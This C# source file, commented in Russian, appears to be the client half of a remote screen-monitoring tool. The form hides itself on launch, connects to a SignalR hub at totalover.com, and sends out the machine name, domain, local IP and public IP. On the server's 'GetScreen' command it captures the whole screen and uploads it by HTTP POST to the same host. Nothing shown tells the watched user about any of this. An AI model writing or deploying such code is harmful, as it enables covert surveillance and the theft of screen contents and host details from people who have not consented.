using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Client
{
    public partial class mainForm : Form
    {
        private HubConnection connection;

        private static string GetLocalIPAddress() //Метод для получения локального ip пк
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            throw new Exception("No adapters");
        }

        public mainForm()
        {
            InitializeComponent();
            Hide();
            connection = new HubConnectionBuilder()
                .WithUrl("http://totalover.com/mainhub")
                .Build(); //Создаем connection к серверу(хаб)

            //Событие запроса скриншота
            connection.On<string>("GetScreen", (fileName) =>
            {
                //Создаем скриншот
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                    Screen.PrimaryScreen.Bounds.Height,
                    PixelFormat.Format32bppArgb);
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                    Screen.PrimaryScreen.Bounds.Y,
                    0,
                    0,
                    Screen.PrimaryScreen.Bounds.Size,
                    CopyPixelOperation.SourceCopy);

                //Сохраняем его как временный файл
                var path = Path.GetFileName(fileName);
                bmpScreenshot.Save(path, ImageFormat.Png);

                //Отправляем скрин на сервер посредствам простого http POST запроса 
                var client = new HttpClient();
                var request = new HttpRequestMessage(HttpMethod.Post, "http://totalover.com/UploadScreen?fileName=" + fileName);
                var content = new MultipartFormDataContent
                {
                    { new StreamContent(File.OpenRead(path)), "uploadedFile", path }
                };
                request.Content = content;
                client.SendAsync(request);
            });

            connection.StartAsync(); //Устанавливаем соединение с хабом
            connection.InvokeAsync("Send", new ConnectionForm()
            {
                Machine = Environment.MachineName,
                Domain = IPGlobalProperties.GetIPGlobalProperties().DomainName.ToString(),
                LocalIP = GetLocalIPAddress(),
                RemoteIP = new WebClient().DownloadString("https://api.seeip.org/jsonip?").Substring(7).Split('"')[0]
        });
        }

        //Событие выхода их приложение через контекстное меню
        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            connection.StopAsync();// Закрываем соединение
            Close();
        }
    }
}
